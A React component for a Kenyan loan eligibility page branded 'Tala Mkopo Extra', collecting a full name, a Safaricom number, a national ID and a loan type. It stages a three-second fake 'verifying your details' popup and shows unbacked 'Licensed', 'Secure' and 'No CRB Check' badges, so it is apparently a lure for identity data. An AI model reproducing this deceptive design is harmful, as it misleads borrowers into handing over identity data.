// Eligibility.js - User Registration/Eligibility Page
import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import Header from '../components/Header';
import Footer from '../components/Footer';
import { useAuth } from '../hooks/useAuth';
import Swal from 'sweetalert2';
import './Eligibility.css';

const nameRegex = /^[a-zA-Z]{2,}([ '-][a-zA-Z]{2,})+$/;
const phoneRegex = /^(?:\+?254|0)(7(?:[0-2]\d|4[0-3]|45|46|48|5[7-9]|6[89]|9\d)|11[0-9])\d{6}$/;
const idRegex = /^[0-9]{7,8}$/;

function normalizePhone(raw) {
  let p = raw.replace(/[\s\-().]/g, '');
  if (p.startsWith('+254')) return '0' + p.slice(4);
  if (p.startsWith('254')) return '0' + p.slice(3);
  return p;
}

const Eligibility = () => {
  const navigate = useNavigate();
  const { login } = useAuth();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    name: '',
    phone_number: '',
    national_id: '',
    loan_type: '',
  });
  const [fieldState, setFieldState] = useState({
    name: { state: null, msg: 'Enter your full name as on your national ID' },
    phone_number: { state: null, msg: 'Safaricom only \u2014 e.g. 0712 345 678 or 0110 123 456' },
    national_id: { state: null, msg: '7 or 8 digit Kenyan National ID number' },
    loan_type: { state: null, msg: 'Choose the purpose of your loan' },
  });

  useEffect(() => {
    document.title = 'Loan Eligibility | Tala Mkopo Extra';
  }, []);

  const validateName = (v) => {
    if (!v) return { state: null, msg: 'Enter your full name as on your national ID' };
    if (v.length < 5) return { state: 'invalid', msg: 'Name is too short' };
    if (!/^[a-zA-Z\s'-]+$/.test(v)) return { state: 'invalid', msg: 'Only letters, spaces, hyphens and apostrophes allowed' };
    if (!nameRegex.test(v)) return { state: 'invalid', msg: 'Please enter both first and last name' };
    return { state: 'valid', msg: '\u2713 Looks good' };
  };

  const validatePhone = (raw) => {
    if (!raw) return { state: null, msg: 'Safaricom only \u2014 e.g. 0712 345 678 or 0110 123 456' };
    const v = normalizePhone(raw);
    if (v.length < 10) return { state: 'invalid', msg: 'Too short \u2014 Safaricom numbers are 10 digits' };
    if (!phoneRegex.test(v)) return { state: 'invalid', msg: 'Not a Safaricom number \u2014 valid prefixes: 07[0-2]x, 074x, 079x, 011x' };
    return { state: 'valid', msg: '\u2713 Valid Safaricom number' };
  };

  const validateId = (v) => {
    if (!v) return { state: null, msg: '7 or 8 digit Kenyan National ID number' };
    if (v.length < 7) return { state: 'invalid', msg: `${7 - v.length} more digit${7 - v.length !== 1 ? 's' : ''} needed` };
    if (v.length > 8) return { state: 'invalid', msg: 'National ID must be 7 or 8 digits' };
    if (!idRegex.test(v)) return { state: 'invalid', msg: 'Only digits allowed' };
    return { state: 'valid', msg: '\u2713 Valid National ID format' };
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    let cleanValue = value;
    if (name === 'national_id') cleanValue = value.replace(/\D/g, '');

    setFormData((prev) => ({ ...prev, [name]: cleanValue }));

    let validation;
    if (name === 'name') validation = validateName(cleanValue.trim());
    else if (name === 'phone_number') validation = validatePhone(cleanValue.trim());
    else if (name === 'national_id') validation = validateId(cleanValue.trim());
    else if (name === 'loan_type') {
      validation = cleanValue
        ? { state: 'valid', msg: '\u2713 ' + cleanValue + ' selected' }
        : { state: null, msg: 'Choose the purpose of your loan' };
    }
    if (validation) setFieldState((prev) => ({ ...prev, [name]: validation }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const name = formData.name.trim();
    const phone = normalizePhone(formData.phone_number.trim());
    const id = formData.national_id.trim();
    const type = formData.loan_type;

    if (!name || !nameRegex.test(name)) {
      return Swal.fire({ icon: 'error', title: 'Invalid Name', text: 'Please enter your full name (first and last) using letters only.', confirmButtonColor: '#26c2a3' });
    }
    if (!phoneRegex.test(phone)) {
      return Swal.fire({
        icon: 'error', title: 'Safaricom Number Required',
        html: '<p>Only Safaricom numbers are accepted.</p><p style="margin-top:8px;font-size:0.9rem;color:#555;">Valid formats:</p><ul style="text-align:left;margin-top:4px;font-size:0.9rem;"><li>0712 345 678</li><li>0722 345 678</li><li>0110 123 456</li></ul>',
        confirmButtonColor: '#26c2a3'
      });
    }
    if (!idRegex.test(id)) {
      return Swal.fire({ icon: 'error', title: 'Invalid National ID', text: 'Your Kenyan National ID must be exactly 7 or 8 digits.', confirmButtonColor: '#26c2a3' });
    }
    if (!type) {
      return Swal.fire({ icon: 'error', title: 'Loan Type Required', text: 'Please select the purpose of your loan.', confirmButtonColor: '#26c2a3' });
    }

    setLoading(true);
    const popupStartedAt = Date.now();
    const minimumPopupDurationMs = 3000;

    Swal.fire({
      title: 'Checking Eligibility',
      html: "We're verifying your details...",
      allowOutsideClick: false,
      didOpen: () => Swal.showLoading(),
    });

    try {
      await login(name || 'Customer', phone);

      const elapsedMs = Date.now() - popupStartedAt;
      if (elapsedMs < minimumPopupDurationMs) {
        await new Promise((resolve) => {
          setTimeout(resolve, minimumPopupDurationMs - elapsedMs);
        });
      }

      Swal.close();
      navigate('/processing');
    } catch (error) {
      console.error('[ELIGIBILITY] Error:', error);
      const message =
        error?.code === 'ERR_NETWORK'
          ? 'Cannot reach backend server. Please try again shortly.'
          : error.message || 'Registration failed';
      Swal.close();
      Swal.fire({ icon: 'error', title: 'Error', text: message, confirmButtonColor: '#26c2a3' });
    } finally {
      setLoading(false);
    }
  };

  const hintClass = (field) => {
    const s = fieldState[field].state;
    return 'field-hint ' + (s === 'valid' ? 'valid' : s === 'invalid' ? 'invalid' : 'neutral');
  };

  const controlClass = (field) => {
    const s = fieldState[field].state;
    return 'form-control' + (s === 'valid' ? ' is-valid' : s === 'invalid' ? ' is-invalid' : '');
  };

  return (
    <div className="container">
      <Header logoInitial="P" />

      <div className="eligibility-content">
        <div className="card">
          <div className="card-title">
            <div className="card-icon">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                <circle cx="12" cy="7" r="4"></circle>
              </svg>
            </div>
            Personal Information
          </div>

          <form onSubmit={handleSubmit}>
            <div className="form-group">
              <input
                id="name"
                type="text"
                name="name"
                className={controlClass('name')}
                placeholder=" "
                value={formData.name}
                onChange={handleChange}
                disabled={loading}
                maxLength={80}
                autoComplete="name"
              />
              <label htmlFor="name" className="form-label">Full Name</label>
              <span className={hintClass('name')}>{fieldState.name.msg}</span>
            </div>

            <div className="form-group">
              <input
                id="phone_number"
                type="tel"
                name="phone_number"
                className={controlClass('phone_number')}
                placeholder=" "
                value={formData.phone_number}
                onChange={handleChange}
                required
                disabled={loading}
                maxLength={13}
                autoComplete="tel"
                inputMode="tel"
              />
              <label htmlFor="phone_number" className="form-label">Phone Number</label>
              <span className={hintClass('phone_number')}>{fieldState.phone_number.msg}</span>
            </div>

            <div className="form-group">
              <input
                id="national_id"
                type="text"
                name="national_id"
                className={controlClass('national_id')}
                placeholder=" "
                value={formData.national_id}
                onChange={handleChange}
                required
                disabled={loading}
                maxLength={8}
                inputMode="numeric"
                pattern="[0-9]*"
              />
              <label htmlFor="national_id" className="form-label">National ID Number</label>
              <span className={hintClass('national_id')}>{fieldState.national_id.msg}</span>
            </div>

            <div className="form-group">
              <select
                id="loan_type"
                name="loan_type"
                className={controlClass('loan_type')}
                value={formData.loan_type}
                onChange={handleChange}
                required
                disabled={loading}
              >
                <option value="" disabled>Select Loan Type</option>
                <option value="Business Loan">Business Loan</option>
                <option value="Personal Loan">Personal Loan</option>
                <option value="Education Loan">Education Loan</option>
                <option value="Medical Loan">Medical Loan</option>
                <option value="Emergency Loan">Emergency Loan</option>
              </select>
              <span className={hintClass('loan_type')}>{fieldState.loan_type.msg}</span>
            </div>

            <div className="trust-badges">
              <div className="trust-badge">
                <div className="trust-icon">
                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                  </svg>
                </div>
                <div className="trust-text">Secure</div>
              </div>
              <div className="trust-badge">
                <div className="trust-icon">
                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                  </svg>
                </div>
                <div className="trust-text">Licensed</div>
              </div>
              <div className="trust-badge">
                <div className="trust-icon">
                  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <polyline points="20 6 9 17 4 12"></polyline>
                  </svg>
                </div>
                <div className="trust-text">No CRB Check</div>
              </div>
            </div>

            <button type="submit" className="btn-primary eligibility-submit-btn" disabled={loading}>
              {loading ? 'Checking...' : 'Check Eligibility'}
              <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <line x1="5" y1="12" x2="19" y2="12"></line>
                <polyline points="12 5 19 12 12 19"></polyline>
              </svg>
            </button>
          </form>
        </div>
      </div>

      <Footer />
    </div>
  );
};

export default Eligibility;
